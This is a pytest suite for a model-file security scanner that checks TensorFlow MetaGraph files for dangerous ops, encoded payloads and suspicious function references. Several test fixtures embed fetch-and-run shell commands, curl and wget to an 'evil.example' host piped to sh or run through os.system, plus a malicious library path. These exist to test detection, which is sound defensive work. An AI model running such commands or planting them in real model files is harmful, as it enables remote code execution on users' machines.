from __future__ import annotations

import importlib
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME
from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.tf_metagraph_scanner import (
    _MAX_ATTR_VALUE_BYTES,
    _MAX_PARSE_BYTES,
    DISCOVERY_ASSUMPTIONS,
    TensorFlowMetaGraphScanner,
    _attr_strings_with_lowered_values,
    _AttrString,
)
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos

pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")


def _get_metagraph_class() -> type:
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    return cast(type, meta_graph_pb2.MetaGraphDef)


def _build_metagraph(
    *,
    graph_nodes: list[dict[str, object]],
    function_nodes: list[dict[str, object]] | None = None,
    collection_bytes: dict[str, list[bytes]] | None = None,
) -> bytes:
    metagraph_cls = _get_metagraph_class()
    metagraph = metagraph_cls()

    metagraph.meta_info_def.meta_graph_version = "modelaudit_test_meta_graph"
    metagraph.meta_info_def.tags.append("serve")

    def add_node_attrs(node: Any, node_spec: dict[str, object]) -> None:
        attrs = node_spec.get("attrs", {})
        if isinstance(attrs, dict):
            for attr_name, attr_value in attrs.items():
                if isinstance(attr_value, bytes):
                    node.attr[str(attr_name)].s = attr_value
                else:
                    node.attr[str(attr_name)].s = str(attr_value).encode("utf-8")

        function_ref = node_spec.get("function_ref")
        if isinstance(function_ref, str):
            node.attr["f"].func.name = function_ref

    for node_spec in graph_nodes:
        node = metagraph.graph_def.node.add()
        node.name = str(node_spec["name"])
        node.op = str(node_spec["op"])
        add_node_attrs(node, node_spec)

    if function_nodes:
        function = metagraph.graph_def.library.function.add()
        function.signature.name = "test_function"
        for node_spec in function_nodes:
            node = function.node_def.add()
            node.name = str(node_spec["name"])
            node.op = str(node_spec["op"])
            add_node_attrs(node, node_spec)

    if collection_bytes:
        for key, values in collection_bytes.items():
            collection = metagraph.collection_def[key]
            for value in values:
                collection.bytes_list.value.append(value)

    return cast(bytes, metagraph.SerializeToString())


def test_tf_metagraph_attr_lowering_reuses_shared_values() -> None:
    class CountingStr(str):
        lower_calls = 0

        def lower(self) -> str:
            type(self).lower_calls += 1
            return super().lower()

    attr_value = CountingStr("BASE64 payload")

    lowered_values = _attr_strings_with_lowered_values((_AttrString("payload", attr_value, len(attr_value)),))

    assert lowered_values == ((_AttrString("payload", attr_value, len(attr_value)), "base64 payload"),)
    assert CountingStr.lower_calls == 1


def test_tf_metagraph_scanner_can_handle_strict(tmp_path: Path) -> None:
    valid_meta = tmp_path / "model.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "const", "op": "Const"}])
    )

    renamed_non_meta = tmp_path / "not_meta.meta"
    renamed_non_meta.write_text("this is not protobuf", encoding="utf-8")

    wrong_extension = tmp_path / "graph.pb"
    wrong_extension.write_bytes(valid_meta.read_bytes())

    assert TensorFlowMetaGraphScanner.can_handle(str(valid_meta)) is True
    assert TensorFlowMetaGraphScanner.can_handle(str(renamed_non_meta)) is False
    assert TensorFlowMetaGraphScanner.can_handle(str(wrong_extension)) is False


def test_tf_metagraph_scanner_can_handle_oversized_meta_for_fail_closed_scan(tmp_path: Path) -> None:
    oversized_meta = tmp_path / "oversized.meta"
    seed = _build_metagraph(graph_nodes=[{"name": "pyfunc_node", "op": "PyFunc"}])
    oversized_meta.write_bytes(seed + b"A" * (_MAX_PARSE_BYTES + 1 - len(seed)))

    assert TensorFlowMetaGraphScanner.can_handle(str(oversized_meta)) is True

    result = TensorFlowMetaGraphScanner().scan(str(oversized_meta))

    assert result.success is False
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
    assert any(issue.message and "MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)

    audit_result = scan_model_directory_or_file(str(oversized_meta))

    assert determine_exit_code(audit_result) == 2


def test_tf_metagraph_scanner_can_handle_stat_failure_for_owned_extension(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated MetaGraph stat failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner.os.path.getsize", raise_os_error)

    assert TensorFlowMetaGraphScanner.can_handle(str(unreadable_meta)) is True


def test_tf_metagraph_scanner_read_failure_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_os_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph read failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_os_error)

    result = TensorFlowMetaGraphScanner().scan(str(unreadable_meta))
    audit_result = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)

    read_checks = [check for check in result.checks if check.name == "MetaGraph File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "metagraph_read_failed"
    assert read_checks[0].details["operational_error_reason"] == "metagraph_read_failed"
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["metagraph_read_failed"]
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "metagraph_read_failed"
    assert audit_result.file_metadata[str(unreadable_meta)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert not [
        issue for issue in audit_result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(audit_result) == 2


def test_tf_metagraph_probe_failures_still_route_to_operational_scan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_detection_error(_path: str) -> str:
        raise OSError("simulated MetaGraph detection read failure")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    def raise_read_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph scanner read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_detection_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_read_error)

    aggregate = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)
    metadata = aggregate.file_metadata[str(unreadable_meta)]

    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert metadata["scan_outcome_reasons"] == ["metagraph_read_failed"]
    assert metadata["operational_error_reason"] == "metagraph_read_failed"
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_read_failure_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    cache_dir = tmp_path / "cache"

    def raise_read_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph scanner read failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_read_error)

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(unreadable_meta),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(unreadable_meta),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(unreadable_meta)]
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["operational_error_reason"] == "metagraph_read_failed"
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_tf_metagraph_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "permission-denied.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def deny_access(_path: str, _mode: int) -> bool:
        return False

    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)

    direct = TensorFlowMetaGraphScanner().scan(str(unreadable_meta))
    aggregate = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)

    assert direct.metadata["scan_outcome_reasons"] == ["metagraph_read_failed"]
    assert direct.metadata["operational_error_reason"] == "metagraph_read_failed"
    assert aggregate.file_metadata[str(unreadable_meta)]["operational_error_reason"] == "metagraph_read_failed"
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_read_failure_takes_precedence_over_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "payload", "op": "PyFunc"}]))
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    original_read_bounded = importlib.import_module("modelaudit.scanners.tf_metagraph_scanner")._read_bounded

    def fail_selected_read(path: str, limit: int) -> tuple[bytes, bool]:
        if path == str(unreadable_meta):
            raise OSError("simulated MetaGraph read failure")
        return cast(tuple[bytes, bool], original_read_bounded(path, limit))

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", fail_selected_read)

    aggregate = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    assert aggregate.file_metadata[str(unreadable_meta)]["operational_error_reason"] == "metagraph_read_failed"
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Path) -> None:
    benign_meta = tmp_path / "benign.meta"
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "notes_const",
                    "op": "Const",
                    "attrs": {
                        "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
                    },
                },
                {"name": "inference", "op": "MatMul"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))

    assert result.success is True
    assert result.has_errors is False
    assert result.has_warnings is False
    assert result.metadata.get("graph_node_count") == 2


def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
                },
                {
                    "name": "loader",
                    "op": "LoadLibrary",
                    "attrs": {"library_path": "/tmp/evil_payload.so"},
                },
            ],
            function_nodes=[
                {
                    "name": "fn_exec",
                    "op": "PyCall",
                    "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
                }
            ],
            collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    dangerous_op_issues = [issue for issue in result.issues if "Dangerous TensorFlow operation" in issue.message]
    assert dangerous_op_issues
    assert any(issue.details.get("op_type") == "PyFunc" for issue in dangerous_op_issues)

    assert any("External library/path reference" in issue.message for issue in result.issues)
    assert any(
        "Multiple independent executable-context risk indicators detected in MetaGraph" in issue.message
        for issue in result.issues
    )


@pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
    loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
    loadlibrary_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "plugin_loader",
                    "op": op_name,
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(loadlibrary_meta))

    assert result.success is False
    assert any(
        issue.message
        and f"Dangerous TensorFlow operation: {op_name}" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("op_type") == op_name
        for issue in result.issues
    )


def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detection(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious-comment.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
                }
            ],
            collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("Executable String Check" in check.name for check in result.checks)


def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
    false_positive_candidate = tmp_path / "fp.meta"
    false_positive_candidate.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "custom_node",
                    "op": "CustomPyFuncMetrics",  # contains "PyFunc" substring but is a different op
                    "attrs": {"notes": "exec and eval terms in non-executable custom metadata"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(false_positive_candidate))

    assert result.success is True
    assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_tf_metagraph_scanner_detects_func_references_in_executable_attr_values(tmp_path: Path) -> None:
    function_ref_meta = tmp_path / "func-ref.meta"
    function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "dangerous_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "os.system",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(function_ref_meta))

    assert result.success is False
    assert any(
        issue.message
        and "Suspicious command/network string found in executable TensorFlow op attribute" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("attribute") == "f.func.name"
        and issue.details.get("value_preview") == "os.system"
        for issue in result.issues
    )


def test_tf_metagraph_scanner_func_reference_false_positive_control(tmp_path: Path) -> None:
    benign_function_ref_meta = tmp_path / "benign-func-ref.meta"
    benign_function_ref_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "benign_call",
                    "op": "StatefulPartitionedCall",
                    "function_ref": "custom_package.systematic_math",
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_function_ref_meta))

    assert result.success is True
    assert not any(
        issue.message
        and "custom_package.systematic_math" in issue.message
        and "command/network string" in issue.message
        for issue in result.issues
    )


def test_tf_metagraph_scanner_detects_split_encoded_payload_and_oversized_attrs(tmp_path: Path) -> None:
    suspicious_meta = tmp_path / "split-payload.meta"
    encoded_blob = "A" * 192
    suspicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {
                        "decoder": "base64.b64decode",
                        "payload": encoded_blob,
                        "script": "A" * (_MAX_ATTR_VALUE_BYTES + 512),
                    },
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(suspicious_meta))

    assert result.success is False
    assert any(issue.message and "Encoded payload indicator found" in issue.message for issue in result.issues)
    assert any(
        issue.message
        and "Large executable-context attribute detected" in issue.message
        and issue.details.get("attribute") == "script"
        and issue.details.get("attribute_length") == _MAX_ATTR_VALUE_BYTES + 512
        for issue in result.issues
    )


def test_tf_metagraph_scanner_checkpoint_io_ops_not_critical(tmp_path: Path) -> None:
    checkpoint_meta = tmp_path / "checkpoint.meta"
    checkpoint_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {"name": "save_op", "op": "SaveV2"},
                {"name": "restore_op", "op": "RestoreV2"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(checkpoint_meta))

    assert all(issue.details.get("op_type") not in {"SaveV2", "RestoreV2"} for issue in result.issues)
    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)


def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
    corrupt_meta = tmp_path / "corrupt.meta"
    corrupt_meta.write_bytes(b"\x0a\x08broken")

    assert TensorFlowMetaGraphScanner.can_handle(str(corrupt_meta)) is False

    result = TensorFlowMetaGraphScanner().scan(str(corrupt_meta))
    assert result.success is False
    assert any("Invalid or corrupt TensorFlow MetaGraph protobuf" in issue.message for issue in result.issues)


def test_tf_metagraph_scanner_records_discovery_assumptions(tmp_path: Path) -> None:
    valid_meta = tmp_path / "meta_assumptions.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "output", "op": "Identity"}])
    )

    result = TensorFlowMetaGraphScanner().scan(str(valid_meta))

    assert result.metadata["discovery_assumptions"] == DISCOVERY_ASSUMPTIONS
